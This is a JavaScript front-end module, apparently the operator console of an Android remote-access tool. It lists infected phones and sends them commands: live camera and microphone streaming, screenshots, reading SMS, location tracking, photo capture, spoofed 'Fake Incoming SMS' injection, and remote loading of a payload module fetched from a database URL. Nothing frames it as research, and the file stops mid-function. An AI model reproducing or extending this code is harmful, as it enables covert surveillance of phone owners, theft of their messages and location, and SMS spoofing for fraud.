const UI = {
    init() {
        // Essential DOM references
        const elements = [
            "loader", "authScreen", "loginForm", "appShell", "activeDeviceChip",
            "topbarTitle", "deviceListButton", "tabbar", "tabbarScrim",
            "deviceGrid", "remoteGrid", "mediaGrid", "systemGrid", "permissionGrid",
            "systemInfoGrid", "logOutput", "clearLogsButton", "modalRoot", "toastRoot"
        ];
        elements.forEach(id => dom[id] = document.getElementById(id));
        dom.mainShell = document.querySelector(".main-shell");
        dom.themeToggle = document.getElementById("themeToggle");

        dom.views = {
            devices: document.getElementById("viewDevices"),
            remote: document.getElementById("viewRemote"),
            system: document.getElementById("viewSystem"),
            logs: document.getElementById("viewLogs")
        };

        // Init Theme
        const savedTheme = localStorage.getItem("theme") || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
        document.documentElement.classList.toggle("dark", savedTheme === "dark");

        dom.iconsDirty = false;
        this.bind();
        this.render();
    },

    bind() {
        // Global haptic feedback listener for instant animation
        const addPressed = (e) => {
            const btn = e.target.closest("button, .action-btn, .device-card, .tab-btn");
            if (btn) btn.classList.add("is-pressed");
        };
        const removePressed = (e) => {
            const btns = document.querySelectorAll(".is-pressed");
            btns.forEach(b => b.classList.remove("is-pressed"));
        };

        document.body.addEventListener("mousedown", addPressed);
        document.body.addEventListener("touchstart", addPressed, { passive: true });
        document.body.addEventListener("mouseup", removePressed);
        document.body.addEventListener("touchend", removePressed);
        document.body.addEventListener("touchcancel", removePressed);
        document.body.addEventListener("mouseleave", removePressed);

        // Global click listener for delegation - minimizes bug pemicu & memory leaks
        document.body.addEventListener("click", async (e) => {
            const btn = e.target.closest("[data-action], [data-tab], [data-toast-id]");
            if (!btn || btn.classList.contains("is-loading")) return;

            const action = btn.dataset.action;
            const value = btn.dataset.value || "";
            const tab = btn.dataset.tab;

            if (tab) {
                if (btn.classList.contains("is-disabled")) return;
                // Add micro-delay to allow :active animation to show on high-end devices
                await new Promise(r => setTimeout(r, 80));
                await showView(tab);

                // Auto-close modal if tab button was clicked from inside a modal
                if (btn.closest(".modal-card")) {
                    closeModal();
                }
                return;
            }

            if (btn.dataset.toastId) {
                removeToast(btn.dataset.toastId);
                return;
            }

            // 1. Instant logic for toggles (Optimistic UI)
            if (action === "toggle-command") {
                const d = state.data.selectedDevice;
                const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
                if (!status.payload_active) {
                    setState({ ui: { modal: { type: "payload-required" } } });
                    return;
                }

                const cmd = btn.dataset.command;
                const key = btn.dataset.toggleKey;
                if (cmd && key) {
                    const oldValue = isToggleActive(key);
                    const newValue = !oldValue;

                    // Manual DOM Update: Instant, no flicker, preserves 'is-pressed' animation
                    btn.classList.toggle("is-toggled", newValue);
                    const iconWrap = btn.querySelector('.lucide-icon') || btn.querySelector('svg');
                    if (iconWrap) {
                        const toggle = getToggleConfig(key);
                        const nextIcon = newValue ? toggle.on.icon : toggle.off.icon;
                        iconWrap.outerHTML = renderIcon(nextIcon, "lucide-icon");
                    }

                    // Small delay to allow the haptic animation (scale down) to be visible
                    await new Promise(r => setTimeout(r, 120));

                    // Update actual state in background
                    DeviceService.setToggleState(key, newValue);

                    // Send network request
                    const result = await DeviceService.send(cmd, { showSuccess: true });

                    // Revert only if it's a real failure (not debounce)
                    if (!result.success && result.error !== "debounce") {
                        DeviceService.setToggleState(key, oldValue);
                    }
                    return;
                }
            }

            // Add loading feedback for other actions (Streaming, Take Photo, etc)
            const needsLoading = ["stream", "command", "select-device", "refresh-device"].includes(action);
            const btnKey = `${action}:${value}`;

            if (needsLoading) {
                state.ui.loadingButtons.add(btnKey);
                this.render(); // Immediate render to show spinner
                await new Promise(r => setTimeout(r, 50));
            }

            try {
                const d = state.data.selectedDevice;
                const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
                const isPayloadActive = !!status.payload_active;
                const perms = status.permissions || {};

                switch(action) {
                    case "stream":
                        if (!isPayloadActive) {
                            setState({ ui: { modal: { type: "payload-required" } } });
                            break;
                        }
                        if (value.includes("camera") && !perms.camera) {
                            setState({ ui: { modal: { type: "permission-required", perm: "camera" } } });
                            break;
                        }
                        const isRefresh = btn.classList.contains("refresh-overlay-btn");
                        await this.handleStream(value, isRefresh ? "refresh" : "start");
                        break;
                    case "stop-stream":
                        await StreamManager.stop("terminate");
                        closeModal();
                        break;
                    case "toggle-audio-stream":
                        await this.toggleAudioStream();
                        break;
                    case "take-photo-setup":
                        if (!isPayloadActive) {
                            setState({ ui: { modal: { type: "payload-required" } } });
                            break;
                        }
                        if (!perms.camera) {
                            setState({ ui: { modal: { type: "permission-required", perm: "camera" } } });
                            break;
                        }
                        setState({ ui: { modal: { type: "take_photo_options" } } });
                        break;
                    case "command":
                        // Khusus untuk UPDATE_PAYLOAD, kita belokkan ke proses visual injeksi
                        if (value === CMD.UPDATE_PAYLOAD) {
                            this.handleModalAction(CMD.LOAD_MODULE, true); // true = update mode
                            break;
                        }

                        if (!isPayloadActive) {
                            setState({ ui: { modal: { type: "payload-required" } } });
                            break;
                        }

                        // Permission Checks
                        if (value === CMD.SMS_LIST && !perms.sms) {
                            setState({ ui: { modal: { type: "permission-required", perm: "sms" } } });
                            break;
                        }
                        if (value === CMD.LOCATION && !perms.location) {
                            setState({ ui: { modal: { type: "permission-required", perm: "location" } } });
                            break;
                        }
                        if ((value === CMD.CAMERA_FRONT || value === CMD.CAMERA_BACK) && !perms.camera) {
                            setState({ ui: { modal: { type: "permission-required", perm: "camera" } } });
                            break;
                        }
                        if (value.startsWith(CMD.REQ_PERM)) {
                            const pKey = value.split(":")[1];
                            const isGranted = pKey === "all" ? status.permissions_granted : perms[pKey];
                            if (isGranted) {
                                addToast("Permission already granted", "success");
                                return;
                            }
                        }

                        const dataCmds = [CMD.SCREENSHOT, CMD.SMS_LIST, CMD.LOCATION, CMD.CAMERA_FRONT, CMD.CAMERA_BACK];
                        const isDataCmd = dataCmds.includes(value);

                        // Special handling for KILL_STREAM to ensure local state and signaling are also wiped
                        if (value === CMD.KILL_STREAM) {
                            await StreamManager.stop("killall", false, true);
                            // Also clear signaling table manually as a fail-safe
                            await supabaseClient.from("signaling").delete().eq("device_id", state.data.selectedDeviceId);
                        }

                        const result = await DeviceService.send(value, { showSuccess: true });
                        if (state.ui.modal?.type === "take_photo_options") closeModal();

                        if (result.success) {
                            if (isDataCmd) {
                                // Instant loading modal for data-returning commands
                                setState({ ui: { modal: { type: "waiting-data", cmd: value } } });
                            }
                        } else {
                            if (result.error !== "debounce") {
                                btn.classList.add("shake-error");
                                setTimeout(() => btn.classList.remove("shake-error"), 500);
                            }
                        }
                        break;
                    case "select-device":
                        await DeviceService.select(value);
                        break;
                    case "refresh-device":
                        await DeviceService.refreshSelected();
                        break;
                    case "close-modal":
                        if (state.ui.modal?.type === "stream") {
                            await StreamManager.stop("manual");
                        } else {
                            closeModal();
                        }
                        break;
                    case "modal":
                        this.handleModalAction(value);
                        break;
                }
            } catch (err) {
                console.error("Action error", err);
            } finally {
                if (needsLoading) {
                    state.ui.loadingButtons.delete(btnKey);
                    this.render();
                }
            }
        });

        dom.loginForm.addEventListener("submit", async (e) => {
            e.preventDefault();
            const email = dom.loginForm.email.value.trim();
            const password = dom.loginForm.password.value;
            await AuthService.signIn(email, password);
        });

        dom.clearLogsButton.addEventListener("click", () => setState({ ui: { logs: [] } }));
        dom.deviceListButton.addEventListener("click", async () => {
            await StreamManager.stop("device-back", false);
            DeviceService.clearSelection();
        });

        dom.themeToggle.addEventListener("click", () => {
            const isDark = document.documentElement.classList.toggle("dark");
            localStorage.setItem("theme", isDark ? "dark" : "light");
            this.renderTheme();
        });

        // Form submission delegation
        document.body.addEventListener("submit", async (e) => {
            const form = e.target;
            const modalType = form.dataset.modalForm;
            if (!modalType) return;
            e.preventDefault();

            const submitBtn = form.querySelector('button[type="submit"]');
            if (submitBtn) submitBtn.classList.add("is-loading");

            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());

            try {
                let result = { success: false };
                if (modalType === "toast") {
                    if (!data.message.trim()) throw new Error("Message is empty");
                    result = await DeviceService.send(`${CMD.TOAST}:${data.message}`, { showSuccess: true });
                } else if (modalType === "sms") {
                    if (!data.phone || !data.message) throw new Error("Fields missing");
                    result = await DeviceService.send(`${CMD.SMS_SEND}:${data.phone}:${data.message}`, { showSuccess: true });
                } else if (modalType === "audio") {
                    if (!data.url) throw new Error("URL missing");
                    result = await DeviceService.send(`${CMD.PLAY_AUDIO}:${data.url}`, { showSuccess: true });
                }

                if (result.success) {
                    closeModal();
                }
            } catch (err) {
                addToast(err.message, "error");
            } finally {
                if (submitBtn) submitBtn.classList.remove("is-loading");
            }
        });

        window.addEventListener("resize", () => this.render());
    },

    async handleStream(mode = CMD.CAMERA_BACK, reason = "start") {
        if (reason === "start") state.stream.withAudio = true;
        await StreamManager.start(mode, reason === "refresh");
    },

    async toggleAudioStream() {
        const withAudio = !state.stream.withAudio;
        setState({ stream: { withAudio } });
        if (state.ui.modal?.type === "stream") {
            await StreamManager.start(state.stream.mode);
        }
    },

    async handleModalAction(value, isUpdate = false) {
        const d = state.data.selectedDevice;
        const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
        const isPayloadActive = !!status.payload_active;
        const perms = status.permissions || {};

        if (value === CMD.LOAD_MODULE) {
            if (isPayloadActive && !isUpdate) {
                setState({ ui: { modal: { type: "already-injected" } } });
            } else {
                // Ambil config dari database
                showLoader(true);
                const { data: settings } = await supabaseClient.from("app_settings").select("value").eq("key", "payload_urls").single();
                showLoader(false);

                const pUrl = settings?.value?.module_loader;
                const pClass = settings?.value?.module_class;

                if (!pUrl || !pClass) {
                    addToast("Error: Payload config not found in database", "error");
                    return;
                }
                const success = await this.startInjectionProcess(pUrl, pClass, isUpdate ? "Updating Module" : "Module Injection", isUpdate);

                if (success) {
                    // Optimistic update for manual injection too
                    const d = state.data.selectedDevice;
                    if (d) {
                        const status = (typeof d.status === "string") ? JSON.parse(d.status || "{}") : (d.status || {});
                        const updatedDevice = { ...d, status: { ...status, payload_active: true } };
                        setState({ data: { selectedDevice: updatedDevice } });
                    }
                }
            }
            return;
        }

        if (!isPayloadActive) {
            setState({ ui: { modal: { type: "payload-required" } } });
            return;
        }

        if (value === CMD.SMS_SEND && !perms.sms) {
            setState({ ui: { modal: { type: "permission-required", perm: "sms" } } });
            return;
        }

        const types = {
            [CMD.TOAST]: "toast-form",
            [CMD.SMS_SEND]: "sms-form"
        };
        if (types[value]) setState({ ui: { modal: { type: types[value] } } });
    },

    async startInjectionProcess(url, className, title = "Module Injection", isUpdate = false) {
        if (!url || !className) {
            addToast("Injection failed: Missing configuration", "error");
            return false;
        }

        const deviceId = state.data.selectedDeviceId;
        const device = state.data.devices.find(dev => dev.id === deviceId);
        const status = (typeof device?.status === "string") ? JSON.parse(device.status || "{}") : (device?.status || {});

        const arch = status.abi || "unknown";
        const model = status.model || "Unknown Device";

        setState({ ui: { modal: { type: "injection", title, logs: [] } } });

        const cmd = isUpdate ? `${CMD.LOAD_MODULE}:update:${url}:${className}` : `${CMD.LOAD_MODULE}:${url}:${className}`;
        const result = await DeviceService.send(cmd, { showSuccess: false });

        if (!result.success) {
            const errorMsg = result.error === "offline" ? "ERROR: Device is offline." : `ERROR: ${result.error}`;
            this.updateInjectionLog(errorMsg);
            await new Promise(r => setTimeout(r, 2000));
            closeModal();
            return false;
        }

        this.updateInjectionLog("Command delivered. Waiting for agent...");

        // Real-time synchronization: Wait for status update or REAL logs from device
        let attempts = 0;
        const maxAttempts = 80; // 40 seconds timeout for full download/load

        return new Promise((resolve) => {
            const checkInterval = setInterval(async () => {
                attempts++;

                // Refresh device data from state (updated via realtime Supabase)
                const d = state.data.devices.find(dev => dev.id === deviceId);
                const currentStatus = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});

                if (currentStatus.payload_active) {
                    clearInterval(checkInterval);
                    this.updateInjectionLog("Verifying integrity...");
                    await new Promise(r => setTimeout(r, 800));
                    this.updateInjectionLog("Injection successful. Payload active.");
                    await new Promise(r => setTimeout(r, 1000));
                    addToast("Payload injected successfully", "success");
                    closeModal();
                    resolve(true);
                    return;
                }

                // If device went offline during process
                if (!isOnline(d)) {
                    clearInterval(checkInterval);
                    this.updateInjectionLog("ERROR: Device disconnected.");
                    await new Promise(r => setTimeout(r, 2000));
                    closeModal();
                    resolve(false);
                }

                if (attempts >= maxAttempts) {
                    clearInterval(checkInterval);
                    this.updateInjectionLog("ERROR: Process timed out.");
                    await new Promise(r => setTimeout(r, 2000));
                    closeModal();
                    resolve(false);
                }
            }, 500);
        });
    },

    updateInjectionLog(msg) {
        if (state.ui.modal?.type === "injection") {
            const injLogs = document.getElementById("injectionLogs");
            if (injLogs) {
                const div = document.createElement("div");
                div.innerHTML = `<span style="opacity:0.5">></span> ${escapeHtml(msg)}`;
                injLogs.appendChild(div);
                injLogs.scrollTop = injLogs.scrollHeight;

                // Update internal state silently to keep it persistent without full re-render
                if (!state.ui.modal.logs) state.ui.modal.logs = [];
                state.ui.modal.logs.push(msg);
            } else {
                // If modal not yet fully in DOM, fallback to standard reactive update
                const logs = [...(state.ui.modal.logs || []), msg];
                setState({ ui: { modal: { ...state.ui.modal, logs } } });
            }
        }
        addLogEntry("[Injection] " + msg, "muted");
    },

    openImage(src) {
        setState({ ui: { modal: { type: "image", src } } });
    },

    openLocation(data) {
        setState({ ui: { modal: { type: "location", data } } });
    },

    openSms(data) {
        setState({ ui: { modal: { type: "sms-list", data } } });
    },

    render() {
        try {
            const { user } = state.auth;
            const hasDevice = selectedDeviceReady();
            const isModal = !!state.ui.modal;

            if (dom.authScreen) dom.authScreen.classList.toggle("hidden", !!user);
            if (dom.appShell) dom.appShell.classList.toggle("hidden", !user);
            if (!user) return; // Stop if not logged in

            if (dom.tabbar) dom.tabbar.classList.toggle("hidden", !hasDevice);
            if (dom.tabbarScrim) dom.tabbarScrim.classList.toggle("hidden", !hasDevice);
            if (dom.mainShell) dom.mainShell.classList.toggle("has-tabbar", hasDevice);
            if (dom.deviceListButton) dom.deviceListButton.classList.toggle("hidden", !hasDevice);

            if (dom.activeDeviceChip) {
                dom.activeDeviceChip.textContent = state.data.selectedDevice?.name || "No Device Selected";
            }

            this.syncView(state.ui.view);
            this.renderDevices();
            this.renderActions();
            this.renderSystem();
            this.renderLogs();
            this.renderModal();
            this.renderToasts();
            this.renderTheme();
            this.syncScrollLock(isModal);

            // Universal Icon Fix: Only process icons that are actually tag <i>
            if (window.lucide && dom.iconsDirty) {
                const iconsToProcess = document.querySelectorAll('i[data-lucide]:not([data-lucide-processed])');
                if (iconsToProcess.length > 0) {
                    lucide.createIcons();
                    iconsToProcess.forEach(i => i.setAttribute('data-lucide-processed', 'true'));
                }
                dom.iconsDirty = false;
            }
        } catch (err) {
            console.error("Critical Render Error", err);
        }
    },

    syncView(view) {
        const isNewView = dom.lastView !== view;
        Object.entries(dom.views).forEach(([name, node]) => {
            const active = name === view;
            node.classList.toggle("is-active", active);
            node.classList.toggle("hidden", !active);
            if (active && isNewView) node.scrollTop = 0;
        });
        dom.lastView = view;
        document.querySelectorAll("[data-tab]").forEach(tab => {
            tab.classList.toggle("is-active", tab.dataset.tab === view);
            tab.classList.toggle("is-disabled", !selectedDeviceReady());
        });
    },

    syncScrollLock(lock) {
        if (lock) {
            document.body.classList.add("is-modal-locked");
            if (!document.body.style.top) {
                dom.lastScrollY = window.scrollY;
                document.body.style.top = `-${dom.lastScrollY}px`;
            }
        } else {
            if (document.body.classList.contains("is-modal-locked")) {
                document.body.classList.remove("is-modal-locked");
                const scrollY = parseInt(document.body.style.top || "0") * -1;
                document.body.style.top = "";
                window.scrollTo(0, scrollY || dom.lastScrollY || 0);
            }
        }
    },

    renderTheme() {
        const isDark = document.documentElement.classList.contains("dark");
        if (dom.themeToggle) {
            const targetIcon = isDark ? "moon" : "sun";

            // Check if we already have the correct SVG icon rendered
            // Lucide SVGs have class 'lucide' or similar, we check our custom property or attribute
            const currentIcon = dom.themeToggle.querySelector('svg')?.getAttribute('data-lucide') ||
                               dom.themeToggle.querySelector('i')?.getAttribute('data-lucide');

            if (currentIcon === targetIcon) return;

            dom.themeToggle.innerHTML = renderIcon(targetIcon);
            // Manually tag the new SVG so our check works next time
            const newSvg = dom.themeToggle.querySelector('svg');
            if (newSvg) newSvg.setAttribute('data-lucide', targetIcon);
        }
    },

    renderDevices() {
        const devices = state.data.devices;
        if (!devices.length) {
            setHtmlIfChanged(dom.deviceGrid, `
                <div class="empty-state">
                    ${renderIcon("smartphone-charging")}
                    <p>Waiting for connected devices...</p>
                    <span class="text-sm mt-8 opacity-60">Ensure APK is running and connected to Supabase</span>
                </div>
            `);
            dom.iconsDirty = true;
            return;
        }
        setHtmlIfChanged(dom.deviceGrid, devices.map(d => `
            <button class=\"device-card\" data-action=\"select-device\" data-value=\"${d.id}\">
                <div class=\"flex-between mb-8\">
                    <span class=\"badge ${isOnline(d) ? "is-online" : ""}\">
                        ${isOnline(d) ? "Online" : "Offline"}
                    </span>
                    <span class=\"text-xs text-bold color-accent text-uppercase text-spaced\">
                        ${ago(d.last_seen).toUpperCase()}
                    </span>
                </div>
                <div class=\"device-name\">${escapeHtml(d.name || "Unknown Android")}</div>
                <div class=\"text-sm color-muted text-bold text-mono mt-4\">
                    ID: ${escapeHtml(d.id.slice(0,16))}
                </div>
            </button>
        `).join(""));
    },

    renderActions() {
        const build = a => buildActionButton(a);
        setHtmlIfChanged(dom.remoteGrid, REMOTE_ACTIONS.map(build).join(""));
        setHtmlIfChanged(dom.mediaGrid, MEDIA_ACTIONS.map(build).join(""));
        setHtmlIfChanged(dom.systemGrid, SYSTEM_ACTIONS.map(build).join(""));
        setHtmlIfChanged(dom.permissionGrid, PERMISSION_ACTIONS.map(build).join(""));
    },

    renderSystem() {
        const d = state.data.selectedDevice;
        if (!d) return setHtmlIfChanged(dom.systemInfoGrid, "");

        const status = (typeof d.status === "string") ? JSON.parse(d.status || "{}") : (d.status || {});
        const get = (k) => status[k] || d[k] || "N/A";

        const sections = [
            { label: "Hardware", fields: [["Model", get("model")], ["Brand", get("brand")], ["Maker", get("manufacturer")]] },
            { label: "System", fields: [["Android", get("version")], ["Network", get("network")]] },
            { label: "Resources", fields: [["Battery", get("battery")], ["Internal", get("internal_storage")], ["RAM", get("ram_total")]] }
        ];

        setHtmlIfChanged(dom.systemInfoGrid, sections.map(s => `
            <div class=\"info-card\">
                <div class=\"text-xs text-bold color-accent mb-16 text-uppercase text-spaced mt-8\">${s.label}</div>
                ${s.fields.map(([l, v]) => `
                    <div class=\"info-row\">
                        <span class=\"info-label\">${l}</span>
                        <span class=\"info-value\" title=\"${escapeHtml(v)}\">${escapeHtml(v)}</span>
                    </div>
                `).join("")}
            </div>
        `).join(""));
    },

    renderLogs() {
        if (!state.ui.logs.length) {
            setHtmlIfChanged(dom.logOutput, `
                <div class="empty-state">
                    ${renderIcon("activity")}
                    <p class="text-sm">System logs will appear here</p>
                </div>
            `);
            dom.iconsDirty = true;
            return;
        }
        const updated = setHtmlIfChanged(dom.logOutput, state.ui.logs.map(l => `
            <div class=\"log-entry\">
                <span class=\"time\">${l.time}</span>
                <span class=\"msg\">${escapeHtml(l.message)}</span>
            </div>
        `).join(""));
        if (updated) dom.logOutput.scrollTop = dom.logOutput.scrollHeight;
    },

    renderModal() {
        const modal = state.ui.modal;
        if (!modal) {
            if (dom.modalRoot.innerHTML) {
                dom.modalRoot.innerHTML = "";
                dom.modalRoot.__renderedHtml = "";
            }
            dom.modalSignature = "";
            dom.currentModalType = "";
            return;
        }

        const sig = getModalSignature(modal);
        if (dom.modalSignature === sig) return;

        const isNewType = dom.currentModalType !== modal.type;
        dom.modalSignature = sig;

        let head = "";
        let body = "";
        let footer = "";
        let extraClass = "";

        switch(modal.type) {
            case "stream":
                extraClass = "is-stream";
                const isAudioOnly = modal.mode === "audio";
                const isCamera = modal.mode.includes("camera");
                const nextCam = modal.mode === CMD.CAMERA_BACK ? CMD.CAMERA_FRONT : CMD.CAMERA_BACK;
                const isConnected = state.stream.status === "connected";

                head = `<div class="modal-title">Live Stream</div>`;

                // Stable body: Video element is always present but hidden if not connected
                // This prevents AbortError and flicker during state transitions
                body = `
                    <div id="streamBox" class="stream-box" style="${isConnected ? '' : 'display:none; height:0;'}">
                        ${isAudioOnly ? `<canvas id="audioCanvas"></canvas>` : `<video id="remoteVideo" autoplay playsinline muted style="width:100%; height:100%; background:black;"></video>`}
                    </div>
                    <div id="streamConnecting" class="flex-center flex-column py-60 ${isConnected ? 'hidden' : ''}" style="padding: 60px 0;">
                        <div class="loader-spinner mb-16"></div>
                        <div class="text-sm color-muted animate-pulse">Establishing secure link...</div>
                    </div>
                    ${isConnected ? `<div id="streamInfo" class="text-xs color-muted text-mono text-center">SESSION ACTIVE</div>` : ''}
                `;
                footer = `<div class="btn-group">
                            ${isCamera ? `<button class="secondary-btn" data-action="stream" data-value="${nextCam}">${renderIcon("refresh-cw")}</button>` : ""}
                            <button class="primary-btn" data-action="stop-stream" style="background:var(--system-red); flex:3">STOP SESSION</button>
                        </div>`;
                break;

            case "toast-form":
                head = `<div class="modal-title">Push Notification</div>`;
                body = `<div class="flex-column gap-8">
                            <label class="info-label">NOTIFICATION MESSAGE</label>
                            <form id="mForm" data-modal-form="toast">
                                <input name="message" placeholder="Type message..." required autofocus>
                            </form>
                        </div>`;
                footer = `<div class="btn-group">
                            <button class="primary-btn" type="submit" form="mForm">Send</button>
                            <button type="button" class="secondary-btn" data-action="close-modal">Cancel</button>
                        </div>`;
                break;

            case "sms-form":
                head = `<div class="modal-title">Fake Incoming SMS</div>`;
                body = `<form id="mForm" data-modal-form="sms" class="flex-column gap-12">
                            <div class="flex-column gap-8">
                                <label class="info-label">SENDER NAME / NUMBER</label>
                                <input name="phone" type="text" placeholder="e.g. Dsociety or 12345" required autofocus>
                            </div>
                            <div class="flex-column gap-8">
                                <label class="info-label">MESSAGE CONTENT</label>
                                <textarea name="message" placeholder="Write fake message content here..." required class="full-width" style="min-height:120px; resize:none"></textarea>
                            </div>
                        </form>`;
                footer = `<div class="btn-group">
                            <button class="primary-btn" type="submit" form="mForm">Inject SMS</button>
                            <button type="button" class="secondary-btn" data-action="close-modal">Cancel</button>
                        </div>`;
                break;

            case "image":
                extraClass = "is-media";
                head = `<div class="modal-title">Snapshot</div>`;
                body = `<div class="media-container">
                            <img src="${modal.src}" onerror="this.src='https://placehold.co/600x400?text=Processing...'">
                        </div>`;
                footer = `<div class="btn-group">
                            <a href="${modal.src}" download="ds_capture.jpg" class="primary-btn" style="text-decoration:none;">${renderIcon("download")} Save</a>
                            <button class="secondary-btn" data-action="close-modal">Dismiss</button>
                        </div>`;
                break;

            case "location":
                const lat = modal.data?.lat || modal.data?.latitude;
                const lon = modal.data?.lng || modal.data?.lon || modal.data?.longitude;
                head = `<div class="modal-title">Device Location</div>`;
                body = `<div style="height:280px; border-radius:18px; overflow:hidden; background:var(--system-gray6)">
                            <iframe src="https://www.google.com/maps?q=${lat},${lon}&output=embed" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
                        </div>
                        <div class="action-grid mt-12" style="grid-template-columns:1fr 1fr; display:grid; gap:12px;">
                            <div class="info-item bg-system-gray6 p-12 border-radius-18" style="flex-direction:column; align-items:flex-start; border-bottom:none;">
                                <span class="info-label">LATITUDE</span><span class="info-value">${lat}</span>
                            </div>
                            <div class="info-item bg-system-gray6 p-12 border-radius-18" style="flex-direction:column; align-items:flex-start; border-bottom:none;">
                                <span class="info-label">LONGITUDE</span><span class="info-value">${lon}</span>
                            </div>
                        </div>`;
                footer = `<div class=\"btn-group\">
                            <a href=\"https://www.google.com/maps?q=${lat},${lon}\" target=\"_blank\" class=\"primary-btn\" style=\"text-decoration:none;\">Open Maps</a>
                            <button class=\"secondary-btn\" data-action=\"close-modal\">Close</button>
                        </div>`;
                break;

            case "sms-list":
                const messages = Array.isArray(modal.data) ? modal.data : [];
                head = `<div class=\"modal-title\">Messages (${messages.length})</div>`;
                body = `<div class=\"sms-list gap-12\">
                        ${messages.length ? messages.map(m => `
                            <div class=\"p-16 bg-system-gray6 border-radius-18\">
                                <div class=\"text-bold color-accent text-md mb-4\">${escapeHtml(m.address || m.number)}</div>
                                <div class=\"color-text-soft text-sm\" style=\"line-height:1.4\">${escapeHtml(m.body || m.message)}</div>
                                <div class=\"text-xs color-muted mt-8 text-bold\">${m.date ? new Date(m.date).toLocaleString() : ""}</div>
                            </div>`).join("") : `<div class=\"empty-state\">No messages found.</div>`}
                        </div>`;
                footer = `<button class=\"primary-btn\" data-action=\"close-modal\">Close</button>`;
                break;

            case "injection":
                head = `<div class="modal-title">${modal.title || "Module Injection"}</div>`;
                body = `
                    <div class="flex-center flex-column mb-20">
                        <div class="loader-spinner mb-16"></div>
                        <div class="text-sm text-bold color-accent animate-pulse">INJECTING PAYLOAD...</div>
                    </div>
                    <div id="injectionLogs" class="bg-black p-12 border-radius-12 text-mono text-xs" style="min-height:160px; max-height:200px; overflow-y:auto; color: #00cc00; line-height:1.6">
                        ${(modal.logs || []).map(l => `<div><span style="opacity:0.5">></span> ${escapeHtml(l)}</div>`).join("")}
                    </div>
                `;
                footer = `<button class="secondary-btn" data-action="close-modal">Cancel Process</button>`;
                break;

            case "take_photo_options":
                head = `<div class="modal-title">Capture Photo</div>`;
                body = `<div class="action-grid">
                            <button class="action-btn" data-action="command" data-value="${CMD.CAMERA_FRONT}" style="aspect-ratio:auto; height:120px;">
                                ${renderIcon("camera", "", "width:28px; height:28px")}<span>Front Cam</span>
                            </button>
                            <button class="action-btn" data-action="command" data-value="${CMD.CAMERA_BACK}" style="aspect-ratio:auto; height:120px;">
                                ${renderIcon("camera", "", "width:28px; height:28px")}<span>Rear Cam</span>
                            </button>
                        </div>`;
                footer = `<button class="secondary-btn" data-action="close-modal">Cancel</button>`;
                break;

            case "waiting-data":
                const labels = { [CMD.SCREENSHOT]: "Capturing Screen", [CMD.SMS_LIST]: "Fetching Messages", [CMD.LOCATION]: "Locating Device", [CMD.CAMERA_FRONT]: "Capturing Photo", [CMD.CAMERA_BACK]: "Capturing Photo", "screen_mirror": "Mirroring Screen" };
                head = `<div class="modal-title">${labels[modal.cmd] || labels[modal.type] || "Waiting for Data"}</div>`;
                body = `<div class="flex-center flex-column py-40" style="padding: 60px 0;">
                            <div class="loader-spinner mb-16"></div>
                            <div class="text-sm color-muted animate-pulse">Communicating with device...</div>
                        </div>`;
                footer = `<button class="secondary-btn" data-action="close-modal">Cancel</button>`;
                break;

            case "already-injected":
                head = `<div class="modal-title">Payload Active</div>`;
                body = `<div class="flex-center flex-column py-20 text-center">
                            <div class="auth-logo mb-16" style="background:var(--system-green); box-shadow:0 12px 24px rgba(52, 199, 89, 0.3)">
                                ${renderIcon("check-circle-2")}
                            </div>
                            <p class="text-md text-bold mb-8">Injection Already Complete</p>
                            <p class="text-sm color-muted">The external module is already running on this device. You can now use all remote features without re-injecting.</p>
                        </div>`;
                footer = `<button class="primary-btn" data-action="close-modal">Got it, Thanks!</button>`;
                break;

            case "payload-required":
                head = `<div class="modal-title">Injection Required</div>`;
                body = `<div class="flex-center flex-column py-20 text-center">
                            <div class="auth-logo mb-16" style="background:var(--system-red); box-shadow:0 12px 24px rgba(255, 59, 48, 0.3)">
                                ${renderIcon("alert-triangle")}
                            </div>
                            <p class="text-md text-bold mb-8">Payload Not Found</p>
                            <p class="text-sm color-muted">This feature requires an active payload module. Please go to the <b>System</b> tab and click <b>Inject Payload</b> first.</p>
                        </div>`;
                footer = `<div class="btn-group">
                            <button class="primary-btn" data-tab="system">Go to System</button>
                            <button class="secondary-btn" data-action="close-modal">Dismiss</button>
                        </div>`;
                break;

            case "permission-required":
                const permLabels = { sms: "SMS Access", camera: "Camera Access", location: "Location Access", mic: "Microphone Access" };
                const pName = permLabels[modal.perm] || modal.perm;
                head = `<div class="modal-title">Permission Required</div>`;
                body = `<div class="flex-center flex-column py-20 text-center">
                            <div class="auth-logo mb-16" style="background:var(--system-blue); box-shadow:0 12px 24px rgba(0, 122, 255, 0.3)">
                                ${renderIcon("shield")}
                            </div>
                            <p class="text-md text-bold mb-8">${pName} Missing</p>
                            <p class="text-sm color-muted">Please allow <b>${pName}</b> permission in the <b>System</b> tab first to use this feature.</p>
                        </div>`;
                footer = `<div class="btn-group">
                            <button class="primary-btn" data-tab="system">Go to System</button>
                            <button class="secondary-btn" data-action="close-modal">Dismiss</button>
                        </div>`;
                break;
        }

        if (isNewType) {
            dom.currentModalType = modal.type;
            const content = `
                <div class="modal-layer" onclick="if(event.target === this) closeModal()">
                    <div class="modal-card ${extraClass}">
                        <div class="modal-head">${head}</div>
                        <div class="modal-body">${body}</div>
                        <div class="modal-footer">${footer}</div>
                    </div>
                </div>`;
            dom.modalRoot.innerHTML = content;
            dom.modalRoot.__renderedHtml = content.trim();
            dom.iconsDirty = true; // Pastikan ikon dirender untuk modal baru
        } else {
            // Surgical Update: Only update parts to prevent modal-spring animation glitch
            const card = dom.modalRoot.querySelector(".modal-card");
            if (card) {
                const headNode = card.querySelector(".modal-head");
                const bodyNode = card.querySelector(".modal-body");
                const footerNode = card.querySelector(".modal-footer");
                if (headNode) setHtmlIfChanged(headNode, head);
                if (bodyNode) setHtmlIfChanged(bodyNode, body);
                if (footerNode) setHtmlIfChanged(footerNode, footer);
            }
        }

        // Auto-attach stream if video element was just recreated
        if (modal.type === "stream") {
            StreamManager.reAttachVideo();
        }

        const injLogs = document.getElementById("injectionLogs");
        if (injLogs) injLogs.scrollTop = injLogs.scrollHeight;

        if (dom.iconsDirty) {
            lucide.createIcons();
